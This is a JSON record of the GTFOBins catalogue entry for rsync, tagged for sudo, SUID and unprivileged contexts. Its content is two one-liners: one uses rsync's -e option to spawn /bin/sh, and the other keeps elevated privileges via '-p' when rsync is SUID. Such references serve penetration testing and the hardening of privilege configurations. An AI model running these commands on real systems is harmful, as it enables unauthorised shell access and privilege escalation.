{"title": "rsync", "source": "gtfobins", "source_label": "GTFOBins", "path": "rsync", "html": "<h1>rsync</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">rsync -e &#x27;/bin/sh -c &quot;/bin/sh 0&lt;&amp;2 1&gt;&amp;2&quot;&#x27; x:x</code></pre>\n<p><strong>SUID override:</strong></p>\n<pre><code class=\"language-bash\">rsync -e &#x27;/bin/sh -p -c &quot;/bin/sh -p 0&lt;&amp;2 1&gt;&amp;2&quot;&#x27; x:x</code></pre>", "excerpt": "rsync Shell rsync -e &#x27;/bin/sh -c &quot;/bin/sh 0&lt;&amp;2 1&gt;&amp;2&quot;&#x27; x:x SUID override: rsync -e &#x27;/bin/sh -p -c &quot;/bin/sh -p 0&lt;&amp;2 1&gt;&amp;2&quot;&#x27; x:x", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}